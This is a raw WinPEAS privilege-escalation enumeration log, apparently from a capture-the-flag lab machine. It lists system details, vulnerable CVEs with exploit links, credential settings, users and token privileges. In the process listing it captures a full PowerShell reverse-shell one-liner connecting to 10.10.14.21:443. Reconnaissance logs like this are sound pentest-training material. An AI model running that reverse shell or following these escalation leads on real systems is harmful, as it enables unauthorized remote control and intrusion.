@@ -1,0 +1,2211 @@
+
+ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+     
+               ((((((((((((((((((((((((((((((((                                                                                                                             
+        (((((((((((((((((((((((((((((((((((((((((((                                                                                                                         
+      ((((((((((((((**********/##########(((((((((((((                                                                                                                      
+    ((((((((((((********************/#######(((((((((((                                                                                                                     
+    ((((((((******************/@@@@@/****######((((((((((                                                                                                                   
+    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                                 
+    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                                
+    (((############*********/%@@@@@@@@@/************((((((((                                                                                                                
+    ((##################(/******/@@@@@/***************((((((                                                                                                                
+    ((#########################(/**********************(((((                                                                                                                
+    ((##############################(/*****************(((((                                                                                                                
+    ((###################################(/************(((((                                                                                                                
+    ((#######################################(*********(((((                                                                                                                
+    ((#######(,.***.,(###################(..***.*******(((((                                                                                                                
+    ((#######*(#####((##################((######/(*****(((((                                                                                                                
+    ((###################(/***********(##############()(((((                                                                                                                
+    (((#####################/*******(################)((((((                                                                                                                
+    ((((############################################)((((((                                                                                                                 
+    (((((##########################################)(((((((                                                                                                                 
+    ((((((########################################)(((((((                                                                                                                  
+    ((((((((####################################)((((((((                                                                                                                   
+    (((((((((#################################)(((((((((                                                                                                                    
+        ((((((((((##########################)(((((((((                                                                                                                      
+              ((((((((((((((((((((((((((((((((((((((                                                                                                                        
+                 ((((((((((((((((((((((((((((((                                                                                                                             
+
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                                       
+                                                                                                                                                                            
+  WinPEAS-ng by @hacktricks_live                                                                                                                                            
+
+       /---------------------------------------------------------------------------------\                                                                                  
+       |                             Do you like PEASS?                                  |                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                  
+       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                  
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                  
+       |         Respect on HTB            :     SirBroccoli                             |                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                  
+       |                                 Thank you!                                      |                                                                                  
+       \---------------------------------------------------------------------------------/                                                                                  
+                                                                                                                                                                            
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+ You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
+   Creating Dynamic lists, this could take a while, please wait...                                                                                                          
+   - Loading sensitive_files yaml definitions file...
+   - Loading regexes yaml definitions file...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+  [X] Exception: Object reference not set to an instance of an object.
+  [X] Exception: The server could not be contacted.
+  [X] Exception: Object reference not set to an instance of an object.
+  [X] Exception: The server could not be contacted.
+  [X] Exception: Object reference not set to an instance of an object.
+  [X] Exception: The server could not be contacted.
+   - Creating active users list (local only)...
+   - Creating disabled users list...
+   - Admin users list...
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+
+
+????????????????????????????????????? System Information ?????????????????????????????????????
+
+???????????? Basic System Information
+? Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
+    OS Name: Microsoft Windows 10 Enterprise
+    OS Version: 10.0.15063 N/A Build 15063
+    System Type: x64-based PC
+    Hostname: Conceal
+    ProductName: Windows 10 Enterprise
+    EditionID: Enterprise
+    ReleaseId: 1703
+    BuildBranch: rs2_release
+    CurrentMajorVersionNumber: 10
+    CurrentVersion: 6.3
+    Architecture: AMD64
+    ProcessorCount: 2
+    SystemLang: en-GB
+    KeyboardLang: English (United Kingdom)
+    TimeZone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+    IsVirtualMachine: True
+    Current Time: 03/02/2024 23:40:07
+    HighIntegrity: False
+    PartOfDomain: False
+    Hotfixes: 
+
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 1703 (15063)
+ [*] Enumerating installed KBs...
+ [!] CVE-2019-0836 : VULNERABLE
+  [>] https://exploit-db.com/exploits/46718
+  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
+
+ [!] CVE-2019-0841 : VULNERABLE
+  [>] https://github.com/rogue-kdc/CVE-2019-0841
+  [>] https://rastamouse.me/tags/cve-2019-0841/
+
+ [!] CVE-2019-1064 : VULNERABLE
+  [>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+ [!] CVE-2019-1130 : VULNERABLE
+  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+ [!] CVE-2019-1253 : VULNERABLE
+  [>] https://github.com/padovah4ck/CVE-2019-1253
+  [>] https://github.com/sgabe/CVE-2019-1253
+
+ [!] CVE-2019-1315 : VULNERABLE
+  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+ [*] Finished. Found 6 potential vulnerabilities.
+                                                                                                                                                                            
+
+???????????? Showing All Microsoft Updates
+  [X] Exception: Exception has been thrown by the target of an invocation.
+
+???????????? System Last Shutdown Date/time (from Registry)
+                                                                                                                                                                            
+    Last Shutdown Date/time        :    02/11/2022 15:07:14
+
+???????????? User Environment Variables
+? Check for some passwords or keys in the env variables 
+    COMPUTERNAME: CONCEAL
+    PUBLIC: C:\Users\Public
+    LOCALAPPDATA: C:\Windows\system32\config\systemprofile\AppData\Local
+    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+    PROCESSOR_ARCHITECTURE: AMD64
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ProgramFiles(x86): C:\Program Files (x86)
+    PROCESSOR_LEVEL: 6
+    ProgramFiles: C:\Program Files
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+    USERPROFILE: C:\Windows\system32\config\systemprofile
+    SystemRoot: C:\Windows
+    APP_POOL_ID: DefaultAppPool
+    ALLUSERSPROFILE: C:\ProgramData
+    APP_POOL_CONFIG: C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config
+    ProgramData: C:\ProgramData
+    PROCESSOR_REVISION: 5507
+    USERNAME: CONCEAL$
+    CommonProgramW6432: C:\Program Files\Common Files
+    CommonProgramFiles: C:\Program Files\Common Files
+    OS: Windows_NT
+    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
+    ComSpec: C:\Windows\system32\cmd.exe
+    PROMPT: $P$G
+    SystemDrive: C:
+    TEMP: C:\Windows\TEMP
+    NUMBER_OF_PROCESSORS: 2
+    APPDATA: C:\Windows\system32\config\systemprofile\AppData\Roaming
+    TMP: C:\Windows\TEMP
+    ProgramW6432: C:\Program Files
+    windir: C:\Windows
+    USERDOMAIN: WORKGROUP
+
+???????????? System Environment Variables
+? Check for some passwords or keys in the env variables 
+    ComSpec: C:\Windows\system32\cmd.exe
+    OS: Windows_NT
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PROCESSOR_ARCHITECTURE: AMD64
+    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+    TEMP: C:\Windows\TEMP
+    TMP: C:\Windows\TEMP
+    USERNAME: SYSTEM
+    windir: C:\Windows
+    NUMBER_OF_PROCESSORS: 2
+    PROCESSOR_LEVEL: 6
+    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
+    PROCESSOR_REVISION: 5507
+
+???????????? Audit Settings
+? Check what is being logged 
+    Not Found
+
+???????????? Audit Policy Settings - Classic & Advanced
+
+???????????? WEF Settings
+? Windows Event Forwarding, is interesting to know were are sent the logs 
+    Not Found
+
+???????????? LAPS Settings
+? If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: LAPS not installed
+
+???????????? Wdigest
+? If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#wdigest
+    Wdigest is not enabled
+
+???????????? LSA Protection
+? If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection                                                                                                      
+    LSA Protection is not enabled
+
+???????????? Credentials Guard
+? If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard
+    CredentialGuard is not enabled
+    Virtualization Based Security Status:      Not enabled
+    Configured:                                False
+    Running:                                   False
+
+???????????? Cached Creds
+? If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials                                                                                                                                                        
+    cachedlogonscount is 10
+
+???????????? Enumerating saved credentials in Registry (CurrentPass)
+
+???????????? AV Information
+    Some AV was detected, search for bypasses
+    Name: Windows Defender
+    ProductEXE: %ProgramFiles%\Windows Defender\MSASCui.exe
+    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
+
+???????????? Windows Defender configuration
+  Local Settings
+  Group Policy Settings
+
+???????????? UAC Status
+? If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                                                          
+    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy: 
+    FilterAdministratorToken: 
+      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.                                                                                            
+
+???????????? PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.15063.0
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: 
+    PS history size: 
+
+???????????? Enumerating PowerShell Session Settings using the registry
+      You must be an administrator to run this check
+
+???????????? PS default transcripts history
+? Read the PS history inside these files (if any)
+
+???????????? HKCU Internet Settings
+    DisableCachingOfSSLPages: 0
+    IE5_UA_Backup_Flag: 5.0
+    PrivacyAdvanced: 1
+    SecureProtocols: 2688
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    CertificateRevocation: 1
+    ZonesSecurityUpgrade: System.Byte[]
+    WarnonZoneCrossing: 0
+    EnableNegotiate: 1
+    MigrateProxy: 1
+    ProxyEnable: 0
+
+???????????? HKLM Internet Settings
+    ActiveXCache: C:\Windows\Downloaded Program Files
+    CodeBaseSearchPath: CODEBASE
+    EnablePunycode: 1
+    MinorVersion: 0
+    WarnOnIntranet: 1
+
+???????????? Drives Information
+? Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 4 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
+
+???????????? Checking WSUS
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
+    Not Found
+
+???????????? Checking KrbRelayUp
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
+  The system isn't inside a domain, so it isn't vulnerable
+
+???????????? Checking If Inside Container
+? If the binary cexecsvc.exe or associated service exists, you are inside Docker 
+You are NOT inside a container
+
+???????????? Checking AlwaysInstallElevated
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated isn't available
+
+???????????? Enumerate LSA settings - auth packages included
+                                                                                                                                                                            
+    auditbasedirectories                 :       0
+    auditbaseobjects                     :       0
+    Bounds                               :       00-30-00-00-00-20-00-00
+    crashonauditfail                     :       0
+    fullprivilegeauditing                :       00
+    LimitBlankPasswordUse                :       1
+    NoLmHash                             :       1
+    Security Packages                    :       ""
+    Notification Packages                :       scecli
+    Authentication Packages              :       msv1_0
+    LsaPid                               :       624
+    SecureBoot                           :       1
+    ProductType                          :       4
+    disabledomaincreds                   :       0
+    everyoneincludesanonymous            :       0
+    forceguest                           :       0
+    restrictanonymous                    :       0
+    restrictanonymoussam                 :       1
+
+???????????? Enumerating NTLM Settings
+  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
+                                                                                                                                                                            
+
+  NTLM Signing Settings                                                                                                                                                     
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : False
+      ServerNegotiateSigning  : False
+      LdapSigning             : Negotiate signing (Negotiate signing)
+
+  Session Security                                                                                                                                                          
+      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
+      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
+                                                                                                                                                                            
+
+  NTLM Auditing and Restrictions                                                                                                                                            
+      InboundRestrictions     :  (Not defined)
+      OutboundRestrictions    :  (Not defined)
+      InboundAuditing         :  (Not defined)
+      OutboundExceptions      : 
+
+???????????? Display Local Group Policy settings - local users/machine
+
+???????????? Checking AppLocker effective policy
+   AppLockerPolicy version: 1
+   listing rules:
+
+
+
+???????????? Enumerating Printers (WMI)
+      Name:                    Microsoft XPS Document Writer
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-4220874023-1166253506-927404976-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-4220874023-1166253506-927404976-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Microsoft Print to PDF
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-4220874023-1166253506-927404976-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-4220874023-1166253506-927404976-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
+      Is default:              True
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Fax
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-4220874023-1166253506-927404976-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-4220874023-1166253506-927404976-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+
+???????????? Enumerating Named Pipes
+  Name                                                                                                 CurrentUserPerms                                                       Sddl
+
+  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+
+  iislogpipe2e1d2285-529a-4674-bcbb-35c9e719c739                                                       Destitute [AllAccess]                                                  O:S-1-5-21-4220874023-1166253506-927404976-1001G:S-1-5-21-4220874023-1166253506-927404976-513D:P(A;;FA;;;SY)(A;;FA;;;S-1-5-21-4220874023-1166253506-927404976-1001)
+
+  vgauth-service                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
+
+
+???????????? Enumerating AMSI registered providers
+    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
+    Path:           C:\Program Files\Windows Defender\MpOav.dll
+
+   =================================================================================================
+
+
+???????????? Enumerating Sysmon configuration
+      You must be an administrator to run this check
+
+???????????? Enumerating Sysmon process creation logs (1)
+      You must be an administrator to run this check
+
+???????????? Installed .NET versions
+                                                                                                                                                                            
+  CLR Versions
+   4.0.30319
+
+  .NET Versions                                                                                                                                                             
+   4.7.02046
+
+  .NET & AMSI (Anti-Malware Scan Interface) support                                                                                                                         
+      .NET version supports AMSI     : False
+      OS supports AMSI               : True
+
+
+????????????????????????????????????? Interesting Events information ?????????????????????????????????????
+
+???????????? Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
+                                                                                                                                                                            
+      You must be an administrator to run this check
+
+???????????? Printing Account Logon Events (4624) for the last 10 days.
+                                                                                                                                                                            
+      You must be an administrator to run this check
+
+???????????? Process creation events - searching logs (EID 4688) for sensitive data.
+                                                                                                                                                                            
+      You must be an administrator to run this check
+
+???????????? PowerShell events - script block logs (EID 4104) - searching for sensitive data.
+                                                                                                                                                                            
+
+???????????? Displaying Power off/on events for last 5 days
+                                                                                                                                                                            
+  03/02/2024 15:43:07     :  Startup
+
+
+????????????????????????????????????? Users Information ?????????????????????????????????????
+
+???????????? Users
+? Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
+  Current user: Destitute
+  Current groups: Domain Users, Everyone, Users, Batch, Console Logon, Authenticated Users, This Organization, Local account, IIS_IUSRS, Local, DefaultAppPool, NTLM Authentication, S-1-5-32-4028125388-2803578072-1053907958-341417128-2434011155-477421480-740873757-3973419746, S-1-5-32-2745667521-2937320506-1424439867-4164262144-2333007343-2599685697-2993844191-2003921822, S-1-5-32-1034403361-4122601751-838272506-684212390-1217345422-475792769-1698384238-1075311541
+   =================================================================================================
+
+    CONCEAL\Administrator: Built-in account for administering the computer/domain
+        |->Groups: Administrators
+        |->Password: CanChange-NotExpi-Req
+
+    CONCEAL\DefaultAccount(Disabled): A user account managed by the system.
+        |->Groups: System Managed Accounts Group
+        |->Password: CanChange-NotExpi-NotReq
+
+    CONCEAL\Destitute
+        |->Password: NotChange-NotExpi-NotReq
+
+    CONCEAL\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |->Groups: Guests
+        |->Password: NotChange-NotExpi-NotReq
+
+
+???????????? Current User Idle Time
+   Current User   :     CONCEAL\Destitute
+   Idle Time      :     07h:57m:01s:703ms
+
+???????????? Display Tenant information (DsRegCmd.exe /status)
+   Tenant is NOT Azure AD Joined.
+
+???????????? Current Token privileges
+? Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation
+    SeAssignPrimaryTokenPrivilege: DISABLED
+    SeIncreaseQuotaPrivilege: DISABLED
+    SeShutdownPrivilege: DISABLED
+    SeAuditPrivilege: DISABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeUndockPrivilege: DISABLED
+    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+    SeTimeZonePrivilege: DISABLED
+
+???????????? Clipboard text
+
+???????????? Logged users
+    CONCEAL\Destitute
+
+???????????? Display information about local users
+   Computer Name           :   CONCEAL
+   User Name               :   Administrator
+   User Id                 :   500
+   Is Enabled              :   True
+   User Type               :   Administrator
+   Comment                 :   Built-in account for administering the computer/domain
+   Last Logon              :   03/02/2024 15:43:58
+   Logons Count            :   84
+   Password Last Set       :   12/10/2018 19:15:16
+
+   =================================================================================================
+
+   Computer Name           :   CONCEAL
+   User Name               :   DefaultAccount
+   User Id                 :   503
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   A user account managed by the system.
+   Last Logon              :   01/01/1970 00:00:00
+   Logons Count            :   0
+   Password Last Set       :   01/01/1970 00:00:00
+
+   =================================================================================================
+
+   Computer Name           :   CONCEAL
+   User Name               :   Destitute
+   User Id                 :   1001
+   Is Enabled              :   True
+   User Type               :   Guest
+   Comment                 :   
+   Last Logon              :   03/02/2024 23:39:13
+   Logons Count            :   5269
+   Password Last Set       :   12/10/2018 19:08:28
+
+   =================================================================================================
+
+   Computer Name           :   CONCEAL
+   User Name               :   Guest
+   User Id                 :   501
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   Built-in account for guest access to the computer/domain
+   Last Logon              :   01/01/1970 00:00:00
+   Logons Count            :   0
+   Password Last Set       :   01/01/1970 00:00:00
+
+   =================================================================================================
+
+
+???????????? RDP Sessions
+    Not Found
+
+???????????? Ever logged users
+    IIS APPPOOL\DefaultAppPool
+    CONCEAL\Administrator
+    CONCEAL\Destitute
+
+???????????? Home folders found
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\DefaultAppPool : DefaultAppPool [AllAccess]
+    C:\Users\Destitute : Destitute [AllAccess]
+    C:\Users\Public : Batch [WriteData/CreateFiles]
+    C:\Users\test
+    C:\Users\WWW Anon Access
+
+???????????? Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultUserName               :  Destitute
+
+???????????? Password Policies
+? Check for a possible brute-force 
+    Domain: Builtin
+    SID: S-1-5-32
+    MaxPasswordAge: 42.22:47:31.7437440
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+    Domain: CONCEAL
+    SID: S-1-5-21-4220874023-1166253506-927404976
+    MaxPasswordAge: 42.00:00:00
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+
+???????????? Print Logon Sessions
+    Method:                       WMI
+    Logon Server:                 
+    Logon Server Dns Domain:      
+    Logon Id:                     9299189
+    Logon Time:                   
+    Logon Type:                   Batch
+    Start Time:                   03/02/2024 22:25:38
+    Domain:                       CONCEAL
+    Authentication Package:       NTLM
+    Start Time:                   03/02/2024 22:25:38
+    User Name:                    Destitute
+    User Principal Name:          
+    User SID:                     
+
+   =================================================================================================
+
+
+
+????????????????????????????????????? Processes Information ?????????????????????????????????????
+
+???????????? Interesting Processes -non Microsoft-
+? Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                                                                                                                                                   
+    cmd(3976)[C:\Windows\SysWOW64\cmd.exe] -- POwn: Destitute
+    Command Line: cmd /cpowershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"                                                                                                                                                     
+   =================================================================================================                                                                        
+
+    conhost(4324)[C:\Windows\system32\conhost.exe] -- POwn: Destitute
+    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
+   =================================================================================================
+
+    win(3884)[C:\Users\Destitute\Desktop\win.exe] -- POwn: Destitute -- isDotNet
+    Permissions: Destitute [AllAccess]
+    Possible DLL Hijacking folder: C:\Users\Destitute\Desktop (Destitute [AllAccess])
+    Command Line: "C:\Users\Destitute\Desktop\win.exe"
+   =================================================================================================                                                                        
+
+    w3wp(4396)[C:\Windows\SysWOW64\inetsrv\w3wp.exe] -- POwn: Destitute
+    Command Line: C:\Windows\SysWOW64\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipmf8c5ab2e-898f-4271-a389-7bc8351d9ea5 -h "C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config" -w "" -m 0 -r 10 -t 20 -ta 0
+   =================================================================================================
+
+    powershell(5048)[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe] -- POwn: Destitute
+    Command Line: powershell  -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"                                                                                                                                                          
+   =================================================================================================                                                                        
+
+
+???????????? Vulnerable Leaked Handlers
+?  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation
+? Getting Leaked Handlers, it might take some time...
+    Handle: 1996(key)
+    Handle Owner: Pid is 3884(win) with owner: Destitute
+    Reason: TakeOwnership
+    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
+   =================================================================================================
+
+    Handle: 2192(key)
+    Handle Owner: Pid is 3884(win) with owner: Destitute
+    Reason: AllAccess
+    Registry: HKLM\system\controlset001\control\nls\customlocale
+   =================================================================================================
+
+    Handle: 1996(key)
+    Handle Owner: Pid is 3884(win) with owner: Destitute
+    Reason: TakeOwnership
+    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
+   =================================================================================================
+
+    Handle: 2192(key)
+    Handle Owner: Pid is 3884(win) with owner: Destitute
+    Reason: AllAccess
+    Registry: HKLM\system\controlset001\control\nls\customlocale
+   =================================================================================================
+
+
+
+????????????????????????????????????? Services Information ?????????????????????????????????????
+  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
+
+???????????? Interesting Services -non Microsoft-
+? Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                                                                                    
+  [X] Exception: Access denied 
+    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
+   =================================================================================================
+
+    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot
+   =================================================================================================
+
+    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System
+   =================================================================================================
+
+    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System                                                                                                                                                  
+   =================================================================================================
+
+    @net1ic64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ic64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i63x64.sys] - System
+   =================================================================================================
+
